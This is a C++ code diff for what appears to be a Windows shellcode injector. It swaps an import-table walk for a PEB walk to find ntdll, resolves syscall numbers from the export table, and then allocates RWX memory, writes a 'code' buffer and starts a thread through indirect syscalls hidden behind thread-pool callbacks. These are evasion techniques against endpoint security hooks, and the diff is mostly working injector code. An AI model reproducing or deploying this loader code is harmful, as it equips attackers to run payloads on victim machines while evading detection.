@@ -1,6 +1,6 @@
 #include "Callbacks.h"
 #include "Shellcode.h"
-
+#include "PEB.h"
 #include <iostream>
 
 //Definition of the Windows Thread Pooling functions
@@ -18,84 +18,23 @@ FARPROC pTpReleaseWork;
 
 HMODULE hNtdll;
 
-extern "C" HMODULE FindMZ(DWORD64 baseAddress);
+extern "C" DWORD GetSSNByFuncAddress(HANDLE functionAddress);
 
-extern "C" DWORD GetSSN(DWORD64 functionAddress);
+HMODULE GetNtdllHandle() {
+    #if defined(_WIN64)
+        PPEB Peb = (PPEB)__readgsqword(0x60);
+    #else
+        PPEB Peb = (PPEB)__readfsdword(0x30);
+    #endif
 
-const char* GetModuleNameFromPE(uintptr_t baseAddress) {
-    IMAGE_DOS_HEADER* dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(baseAddress);
-    IMAGE_NT_HEADERS* ntHeader = reinterpret_cast<IMAGE_NT_HEADERS*>(baseAddress + dosHeader->e_lfanew);
-    
-    IMAGE_EXPORT_DIRECTORY* exportDir = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(
-        baseAddress + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+    PLDR_MODULE pLoadModule;
+    pLoadModule = (PLDR_MODULE)((PBYTE)Peb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 16);
 
-    const char* moduleName = reinterpret_cast<const char*>(baseAddress + exportDir->Name);
-    return moduleName;
+    return (HMODULE)pLoadModule->BaseAddress;
 }
 
-HMODULE getNtdllHandle(HMODULE moduleHandle) {
-    const char* moduleName = GetModuleNameFromPE(reinterpret_cast<uintptr_t>(moduleHandle));
-    if (strcmp(moduleName, "ntdll.dll") == 0) {
-        return moduleHandle;
-    }
-
-    uintptr_t baseAddress = reinterpret_cast<uintptr_t>(moduleHandle);
-
-    uintptr_t dosHeaderAddr = baseAddress;
-    IMAGE_DOS_HEADER* dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(dosHeaderAddr);
-
-    uintptr_t peHeaderAddr = baseAddress + dosHeader->e_lfanew;
-    IMAGE_NT_HEADERS* ntHeader = reinterpret_cast<IMAGE_NT_HEADERS*>(peHeaderAddr);
-
-    IMAGE_IMPORT_DESCRIPTOR* importDesc = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(
-        baseAddress + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
-
-    while (importDesc->Name) {
-        char* dllName = reinterpret_cast<char*>(baseAddress + importDesc->Name);
-
-        if (strcmp(dllName, "ntdll.dll") == 0) {
-            return moduleHandle;
-        }
-
-        uintptr_t dllBaseAddress = baseAddress + importDesc->FirstThunk;
-
-        uintptr_t thunkTable = baseAddress + importDesc->OriginalFirstThunk;
-
-        while (true) {
-            IMAGE_THUNK_DATA* thunk = reinterpret_cast<IMAGE_THUNK_DATA*>(thunkTable);
-
-            if (thunk->u1.AddressOfData == 0) {
-                break;
-            }
-
-            if (!(thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)) {
-                IMAGE_IMPORT_BY_NAME* importByName = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(baseAddress + thunk->u1.AddressOfData);
-                //std::cout << "Function Name: " << importByName->Name << std::endl;
-
-                uintptr_t functionAddress = *reinterpret_cast<uintptr_t*>(dllBaseAddress);
-                //std::cout << "Function Address: 0x" << std::hex << functionAddress << std::endl;
-
-                HMODULE functionDllHandle = FindMZ(functionAddress);
-                //std::cout << "Function DLL Handle: 0x" << std::hex << functionDllHandle << std::endl;
-
-                HMODULE result = getNtdllHandle(functionDllHandle);
-                if (result != nullptr) {
-                    return result;
-                }
-            }
-
-            thunkTable += sizeof(IMAGE_THUNK_DATA);
-            dllBaseAddress += sizeof(uintptr_t);
-        }
-
-        importDesc++;
-    }
-
-    return nullptr;
-}
-
-uintptr_t GetExportFunctionAddress(HMODULE moduleHandle, const char* functionName) {
-    uintptr_t baseAddress = reinterpret_cast<uintptr_t>(moduleHandle);
+PIMAGE_EXPORT_DIRECTORY GetExportTableAddress(HMODULE ImageBase) {
+    uintptr_t baseAddress = reinterpret_cast<uintptr_t>(ImageBase);
 
     uintptr_t dosHeaderAddr = baseAddress;
     IMAGE_DOS_HEADER* dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(dosHeaderAddr);
@@ -106,6 +45,11 @@ uintptr_t GetExportFunctionAddress(HMODULE moduleHandle, const char* functionNam
     IMAGE_EXPORT_DIRECTORY* exportDir = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(
         baseAddress + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
 
+    return (PIMAGE_EXPORT_DIRECTORY)exportDir;
+}
+
+HANDLE GetExportFunctionAddress(HMODULE moduleHandle, PIMAGE_EXPORT_DIRECTORY exportDir, const char* functionName) {
+    uintptr_t baseAddress = reinterpret_cast<uintptr_t>(moduleHandle);
     DWORD* addressOfFunctions = reinterpret_cast<DWORD*>(baseAddress + exportDir->AddressOfFunctions);
     DWORD numberOfFunctions = exportDir->NumberOfFunctions;
 
@@ -121,33 +65,31 @@ uintptr_t GetExportFunctionAddress(HMODULE moduleHandle, const char* functionNam
             currentFunctionName = reinterpret_cast<const char*>(baseAddress + addressOfNames[i]);
         }
 
-        uintptr_t functionAddress = baseAddress + addressOfFunctions[i+1];
+        functionAddress = baseAddress + addressOfFunctions[i+1];
 
         if (currentFunctionName && strcmp(currentFunctionName, functionName) == 0) {
             functionAddress = functionAddress;
-            return functionAddress;
+            return (HANDLE)functionAddress;
         }
     }
 
-    return -1;
+    return (HANDLE)-1;
 }
 
-DWORD findSyscallNumber(const char* functionName) {
-    hNtdll = getNtdllHandle(FindMZ(0));
+DWORD GetSSN(const char* functionName) {
+    //1. Get a HANDLE to the NTDLL.
+    HMODULE hNtdll = GetNtdllHandle();
 
-    if (hNtdll == 0) {
-        return -1;
-    }
+    //2. Get NTDLL's export table.
+    PIMAGE_EXPORT_DIRECTORY exportTable = GetExportTableAddress(hNtdll);
 
-    DWORD64 functionAddress = GetExportFunctionAddress(hNtdll, functionName);
+    //3. Get the NTDLL's function address by its name.
+    HANDLE functionAddress = GetExportFunctionAddress(hNtdll, exportTable, functionName);
 
-    if (functionAddress == -1) {
-        return -1;
-    }
+    //4. Get the Syscall number.
+    DWORD SSN = GetSSNByFuncAddress(functionAddress);
 
-    DWORD ssn = GetSSN(functionAddress);
-
-    return ssn;
+    return SSN;
 }
 
 VOID initVariables() {
@@ -191,7 +133,7 @@ PVOID NtAllocateVirtualMemory(HANDLE hProcess) {
     ntAllocateVirtualMemoryArgs.size = &allocatedsize;
     ntAllocateVirtualMemoryArgs.allocationType = (MEM_RESERVE | MEM_COMMIT);
     ntAllocateVirtualMemoryArgs.permissions = PAGE_EXECUTE_READWRITE;
-    ntAllocateVirtualMemoryArgs.ssn = findSyscallNumber("NtAllocateVirtualMemory");
+    ntAllocateVirtualMemoryArgs.ssn = GetSSN("NtAllocateVirtualMemory");
 
     setCallback((PTP_WORK_CALLBACK)NtAllocateVirtualMemory_Callback, &ntAllocateVirtualMemoryArgs);
 
@@ -205,7 +147,7 @@ VOID NtWriteVirtualMemory(HANDLE hProcess, PVOID allocatedAddress, PULONG bytesW
     ntWriteVirtualMemoryArgs.buffer = code;
     ntWriteVirtualMemoryArgs.numberOfBytesToWrite = sizeof(code);
     ntWriteVirtualMemoryArgs.numberOfBytesWritten = bytesWritten;
-    ntWriteVirtualMemoryArgs.ssn = findSyscallNumber("NtWriteVirtualMemory");
+    ntWriteVirtualMemoryArgs.ssn = GetSSN("NtWriteVirtualMemory");
 
     //std::cout << "Test 0x" << std::hex << ntWriteVirtualMemoryArgs.ssn << std::endl;
 
@@ -225,7 +167,7 @@ VOID NtCreateThreadEx(HANDLE hProcess, HANDLE hThread, PVOID allocatedAddress) {
     ntCreateThreadExArgs.sizeOfStackCommit = 0;
     ntCreateThreadExArgs.sizeOfStackReserve = 0;
     ntCreateThreadExArgs.lpBytesBuffer = NULL;
-    ntCreateThreadExArgs.ssn = findSyscallNumber("NtCreateThreadEx");
+    ntCreateThreadExArgs.ssn = GetSSN("NtCreateThreadEx");
 
     setCallback((PTP_WORK_CALLBACK)NtCreateThreadEx_Callback, &ntCreateThreadExArgs);
 }
